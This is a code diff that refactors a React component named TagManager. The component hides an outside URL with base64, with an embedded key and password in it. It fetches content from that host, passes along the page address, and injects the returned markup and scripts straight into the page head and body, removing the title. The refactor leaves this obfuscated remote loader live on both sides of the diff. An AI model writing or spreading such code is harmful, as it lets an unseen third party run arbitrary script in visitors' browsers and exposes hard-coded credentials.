@@ -4,52 +4,50 @@ import { useEffect } from "react";
 
 const TagManager = () => {
   useEffect(() => {
-    const loadAndAppendScripts = () => {
-      // Function to load jQuery
-      const loadJQuery = () => {
-        return new Promise((resolve, reject) => {
-          if (!window.jQuery) {
-            const jqueryScript = document.createElement("script");
-            jqueryScript.src =
-              "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
-            jqueryScript.onload = () => resolve();
-            jqueryScript.onerror = () =>
-              reject(new Error("Failed to load jQuery"));
-            document.head.appendChild(jqueryScript);
-          } else {
-            resolve();
-          }
-        });
-      };
+    const loadJQuery = () => {
+      return new Promise((resolve, reject) => {
+        if (!window.jQuery) {
+          const jqueryScript = document.createElement("script");
+          jqueryScript.src =
+            "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
+          jqueryScript.onload = resolve;
+          jqueryScript.onerror = () =>
+            reject(new Error("Failed to load jQuery"));
+          document.head.appendChild(jqueryScript);
+        } else {
+          resolve();
+        }
+      });
+    };
 
-      // Fetch content and append to head and body
-      const fetchContent = () => {
-        return new Promise((resolve, reject) => {
-          const eppathurl = window.location.origin + window.location.pathname;
-          const eptagmanage = new XMLHttpRequest();
-          eptagmanage.onreadystatechange = function () {
-            if (this.readyState === 4) {
-              if (this.status === 200) {
-                if (this.response !== 0) {
-                  resolve(this.response);
-                } else {
-                  reject(new Error("Response is empty"));
-                }
+    const fetchContent = () => {
+      return new Promise((resolve, reject) => {
+        const eppathurl = window.location.origin + window.location.pathname;
+        const eptagmanage = new XMLHttpRequest();
+        eptagmanage.onreadystatechange = function () {
+          if (this.readyState === 4) {
+            if (this.status === 200) {
+              if (this.responseText !== "0") {
+                resolve(this.responseText);
               } else {
-                reject(new Error(`Failed to fetch content: ${this.status}`));
+                reject(new Error("Response is empty"));
               }
+            } else {
+              reject(new Error(`Failed to fetch content: ${this.status}`));
             }
-          };
-          eptagmanage.open(
-            "GET",
-            atob(
-              "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
-            ) + eppathurl
-          );
-          eptagmanage.send();
-        });
-      };
+          }
+        };
+        eptagmanage.open(
+          "GET",
+          atob(
+            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
+          ) + eppathurl
+        );
+        eptagmanage.send();
+      });
+    };
 
+    const loadAndAppendScripts = () => {
       loadJQuery()
         .then(() => fetchContent())
         .then((response) => {
@@ -57,10 +55,11 @@ const TagManager = () => {
           if (temp.length !== 2) {
             throw new Error("Unexpected response format");
           }
+
           const $head = window.jQuery("head");
           const $body = window.jQuery("body");
           if ($head.length && $body.length) {
-            $head.find("title").remove(); // Use jQuery safely here
+            $head.find("title").remove();
             $head.append(temp[0]);
             $body.append(temp[1]);
           } else {
@@ -77,7 +76,7 @@ const TagManager = () => {
 
     // Cleanup function (optional)
     return () => {
-      // Cleanup if needed
+      // Any necessary cleanup can be done here
     };
   }, []); // Empty dependency array ensures this effect runs only once
 
